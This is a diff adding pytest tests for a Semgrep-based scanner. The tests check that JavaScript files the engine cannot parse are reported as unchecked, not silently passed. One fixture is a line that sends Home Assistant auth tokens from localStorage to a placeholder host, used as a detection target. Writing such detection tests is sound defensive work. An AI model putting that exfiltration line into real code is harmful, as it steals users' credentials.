@@ -1,9 +1,11 @@
 """Post-filters on Semgrep results (parsed with ast, never run)."""
 
+from pathlib import Path
+
 from conftest import requires_semgrep
 
 from sniff_test.analyzers import semgrep
-from sniff_test.models import Category, Finding, Severity
+from sniff_test.models import RULE_FILE_NOT_CHECKED, Category, Finding, Severity
 
 SRC = """from homeassistant import config_entries
 import homeassistant
@@ -85,3 +87,92 @@ def test_raw_fstring_beside_new_syntax_no_longer_hides_a_file(tmp_path):
     data = json.loads(out.stdout)
     assert data["errors"] == []
     assert [r["start"]["line"] for r in data["results"]] == [14]
+
+
+def _err(kind, path, spans=None):
+    return {"type": [kind, spans] if spans is not None else kind, "path": str(path)}
+
+
+def _span(start, end):
+    return {"start": {"line": 1, "col": 1, "offset": start}, "end": {"offset": end}}
+
+
+def _parse_rules(errors, root):
+    return sorted((f.file, f.rule_id, str(f.severity)) for f in
+                  semgrep._parse_error_findings(errors, root))  # fmt: skip
+
+
+def test_a_file_no_rule_read_is_its_own_finding(tmp_path):
+    """Semgrep says which it was: "Syntax error" (nothing checked) or PartialParsing with
+    the skipped spans. Only a small gap stays the low `scan-parse-error`."""
+    for name in ("unread.js", "gap.js", "whole.js", "nospans.js", "both.py", "types.d.ts"):
+        (tmp_path / name).write_text("x" * 1000)
+    errors = [
+        _err("Syntax error", tmp_path / "unread.js"),
+        _err("PartialParsing", tmp_path / "gap.js", [_span(0, 6), _span(0, 1)]),
+        _err("PartialParsing", tmp_path / "whole.js", [_span(0, 1000)]),
+        _err("PartialParsing", tmp_path / "nospans.js", []),
+        _err("PartialParsing", tmp_path / "both.py", [_span(0, 3)]),
+        _err("Other syntax error", tmp_path / "both.py"),
+        _err("Syntax error", tmp_path / "types.d.ts"),  # declarations never run
+        _err("Syntax error", tmp_path / "notes.md"),  # not code
+        _err("Timeout", tmp_path / "gap.js"),
+    ]
+    assert _parse_rules(errors, tmp_path) == [
+        ("both.py", RULE_FILE_NOT_CHECKED, "medium"),
+        ("gap.js", "scan-parse-error", "low"),
+        ("nospans.js", RULE_FILE_NOT_CHECKED, "medium"),
+        ("types.d.ts", "scan-parse-error", "low"),
+        ("unread.js", RULE_FILE_NOT_CHECKED, "medium"),
+        ("whole.js", RULE_FILE_NOT_CHECKED, "medium"),
+    ]
+
+
+def test_an_engine_that_gave_up_leaves_the_scan_incomplete():
+    """Out of memory or a crash on a file may not repeat: that is "didn't finish"
+    (retried), not a finding. A parse failure repeats, so it isn't counted here."""
+    names = ["Timeout", "Out of memory", "Stack overflow", "Fatal error", "Syntax error"]
+    errors = [{"type": n} for n in names] + [{"type": ["PartialParsing", []]}]
+    assert semgrep._unfinished(errors) == (1, 3)
+    assert semgrep._unfinished([{"type": "Syntax error"}]) == (0, 0)
+
+
+# Reduced from HACS 2.0.5's hacs_frontend/frontend_latest/1117.4a5305eb6e7fdca3.js (1.65 MB,
+# CodeMirror): a class minified to the name `as`, and an arrow function whose body is a
+# function called on the spot. Valid JavaScript; each line alone parses.
+_UNREADABLE_JS = (
+    "function m(t){ return new as(t, -1) }\n"
+    "function Us(n){ return n.map((t => function(t, e){ return t }(t, 1))) }\n"
+)
+_TOKEN_JS = 'fetch("https://collect.invalid/c", {body: localStorage.getItem("hassTokens")});\n'
+
+
+@requires_semgrep
+def test_semgrep_cannot_read_this_file_and_we_say_so(tmp_path):
+    """On Semgrep 1.185 no rule runs on the first file (0 results, "Syntax error"), or on
+    the second, which comes back as PartialParsing with one span over the whole file. If a
+    newer Semgrep parses them, this fails: re-run the noise set's parse-error count."""
+    import json
+    import subprocess
+
+    (tmp_path / "a.js").write_text(_UNREADABLE_JS + _TOKEN_JS)
+    (tmp_path / "b.js").write_text(_UNREADABLE_JS.replace("-1", "1") + _TOKEN_JS)
+    (tmp_path / "c.js").write_text("var x = n?.5:1;\n" + _TOKEN_JS * 20)  # the cards' small gap
+    run = tmp_path / "run"
+    run.mkdir()
+    out = subprocess.run(
+        ["semgrep", "scan", "--config", str(semgrep.rules_dir() / "js"), "--json",
+         "--metrics=off", "--disable-version-check", "--no-git-ignore",
+         *(str(tmp_path / n) for n in ("a.js", "b.js", "c.js"))],
+        cwd=run, capture_output=True, text=True, check=False,
+    )  # fmt: skip
+    data = json.loads(out.stdout)
+    hit = {Path(r["path"]).name for r in data["results"]}
+    assert hit == {"c.js"}  # the token line is found only where the file was read
+    kinds = {Path(e["path"]).name: semgrep._error_type(e) for e in data["errors"]}
+    assert kinds == {"a.js": "Syntax error", "b.js": "PartialParsing", "c.js": "PartialParsing"}
+    assert _parse_rules(data["errors"], tmp_path) == [
+        ("a.js", RULE_FILE_NOT_CHECKED, "medium"),
+        ("b.js", RULE_FILE_NOT_CHECKED, "medium"),
+        ("c.js", "scan-parse-error", "low"),
+    ]
